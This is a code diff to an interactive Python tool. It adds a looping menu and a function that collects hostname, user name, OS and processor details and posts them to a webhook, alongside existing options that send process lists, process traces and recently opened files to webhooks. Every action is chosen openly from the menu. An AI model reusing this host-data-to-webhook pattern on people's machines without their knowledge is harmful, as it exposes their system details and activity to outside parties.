@@ -180,7 +180,7 @@ def find_process_traces(name):
     return traces
 
 def scan_recent_activity():
-    """Scan for recent activity."""
+    """Scan recent activity like recently opened files and temp files."""
     recent_files = []
     user = getpass.getuser()
     paths_to_check = [
@@ -200,9 +200,25 @@ def scan_recent_activity():
     
     return recent_files
 
+def get_system_info():
+    """Get system information."""
+    system_info = {
+        "System": platform.system(),
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "User": getpass.getuser(),
+        "System Architecture": platform.architecture(),
+        "Python Version": platform.python_version()
+    }
+    
+    info_str = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
+    return info_str
+
 def get_database_results():
     """Simulate a database search and provide results."""
-    # Mock data for demonstration purposes
     database_results = {
         "Spotify": ["C:\\Users\\Public\\Documents\\SpotifyLogs\\log.txt"],
         "Steam": ["C:\\Program Files (x86)\\Steam\\logs\\connection_log.txt"],
@@ -225,63 +241,66 @@ def main():
     # Set up log file
     log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
     
-    # User input
-    print("Please select an option:")
-    print("1. Get Processes")
-    print("2. Get Admin Processes")
-    print("3. Scan for Process Traces")
-    print("4. Scan Recent Activity")
-    print("5. Get Database Results")
-    print("6. Exit")
+    while True:
+        # User input
+        print("\nPlease select an option:")
+        print("1. Get Processes")
+        print("2. Get Admin Processes")
+        print("3. Scan for Process Traces")
+        print("4. Scan Recent Activity")
+        print("5. Get Database Results")
+        print("6. Get System Information")
+        print("7. Exit")
+        print("")
 
-    choice = input("Enter your choice (1-6): ")
-    
-    if choice == '1':
-        print("Enter webhook delay in seconds: ")
-        webhook_delay = int(input().strip())
-        processes = get_processes()
-        formatted_processes = format_processes(processes)
-        send_embed_to_webhook("Processes", formatted_processes, 0x00FF00, WEBHOOK_URLS['processes'])
+        choice = input("Enter your choice (1-7): ").strip()
 
-    elif choice == '2':
-        print("Enter webhook delay in seconds: ")
-        webhook_delay = int(input().strip())
-        admin_processes = get_admin_processes()
-        formatted_admin_processes = format_processes(admin_processes)
-        send_embed_to_webhook("Admin Processes", formatted_admin_processes, 0x00FF00, WEBHOOK_URLS['admin_processes'])
+        if choice == '7':
+            print("Exiting...")
+            break
 
-    elif choice == '3':
-        print("Enter the process name to trace (e.g., 'spotify'): ")
-        process_name = input().strip()
         print("Enter webhook delay in seconds: ")
-        webhook_delay = int(input().strip())
-        traces = find_process_traces(process_name)
-        if traces:
-            traces_info = "\n".join(traces)
+        try:
+            webhook_delay = int(input().strip())
+        except ValueError:
+            print("Invalid delay value. Exiting...")
+            break
+
+        if choice == '1':
+            processes = get_processes()
+            formatted_processes = format_processes(processes)
+            send_embed_to_webhook("Processes", formatted_processes, 0x00FF00, WEBHOOK_URLS['processes'])
+
+        elif choice == '2':
+            admin_processes = get_admin_processes()
+            formatted_admin_processes = format_processes(admin_processes)
+            send_embed_to_webhook("Admin Processes", formatted_admin_processes, 0x00FF00, WEBHOOK_URLS['admin_processes'])
+
+        elif choice == '3':
+            print("Enter the process name to trace (e.g., 'spotify'): ")
+            process_name = input().strip()
+            traces = find_process_traces(process_name)
+            if traces:
+                traces_info = "\n".join(traces)
+            else:
+                traces_info = f"No traces found for process: {process_name}"
+            send_embed_to_webhook("Process Traces", traces_info, 0xFFFF00, WEBHOOK_URLS['traces'])
+
+        elif choice == '4':
+            recent_files = scan_recent_activity()
+            recent_activity_info = "\n".join(recent_files)
+            send_embed_to_webhook("Recent Activity", recent_activity_info, 0x00FFFF, WEBHOOK_URLS['recent_activity'])
+
+        elif choice == '5':
+            database_results = get_database_results()
+            send_embed_to_webhook("Database Results", database_results, 0xFF00FF, WEBHOOK_URLS['database'])
+
+        elif choice == '6':
+            system_info = get_system_info()
+            send_embed_to_webhook("System Information", system_info, 0xFF00FF, WEBHOOK_URLS['system_info'])
+
         else:
-            traces_info = f"No traces found for process: {process_name}"
-        send_embed_to_webhook("Process Traces", traces_info, 0xFFFF00, WEBHOOK_URLS['traces'])
-
-    elif choice == '4':
-        print("Enter webhook delay in seconds: ")
-        webhook_delay = int(input().strip())
-        recent_files = scan_recent_activity()
-        recent_activity_info = "\n".join(recent_files)
-        send_embed_to_webhook("Recent Activity", recent_activity_info, 0x00FFFF, WEBHOOK_URLS['recent_activity'])
-
-    elif choice == '5':
-        print("Enter webhook delay in seconds: ")
-        webhook_delay = int(input().strip())
-        database_results = get_database_results()
-        send_embed_to_webhook("Database Results", database_results, 0xFF00FF, WEBHOOK_URLS['database'])
-
-    elif choice == '6':
-        print("Exiting...")
-        return
-
-    else:
-        print("Invalid choice. Exiting...")
-        return
+            print("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
     main()
